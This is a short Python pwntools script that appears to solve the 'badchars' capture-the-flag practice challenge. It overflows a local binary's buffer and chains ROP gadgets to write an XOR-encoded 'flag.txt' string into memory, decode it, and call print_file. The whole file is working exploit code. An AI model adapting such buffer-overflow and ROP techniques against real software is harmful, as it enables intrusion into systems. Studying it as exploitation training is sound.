from pwn import *

elf = ELF('badchars')

pattern = b"A"*40


def prepare_flag():
	buf = ""
	for i in 'flag.txt':
		buf += (hex(ord(i)^2)[2:])
	length = len(buf)
	res = "0x"
	for i in range(length-1, 0, -2):
		res += buf[i-1]+buf[i]
	print(res)
	return(int(res,16))
	

pop_r12_r13_r14_r15 = p64(0x000000000040069c)
flag = p64(prepare_flag())
data = 0x0000000000601038
junk = p64(2022)
mov_r13_r12 = p64(0x0000000000400634)
pop_r14_r15 = p64(0x00000000004006a0)
xor_r15_r14 = p64(0x0000000000400628)
pop_rdi = p64(0x00000000004006a3)
print_file = p64(0x400510)

payload = pattern 
payload += pop_r12_r13_r14_r15 + flag + p64(data) + junk + junk
payload += mov_r13_r12 

#Access data and xor by 2
for i in range(8):
	payload += pop_r14_r15 + p64(2) + p64(data+i)
	payload += xor_r15_r14

payload += pop_rdi + p64(data)
payload += print_file

print(payload)
p = process(elf.path)
p.sendline(payload)
p.interactive()
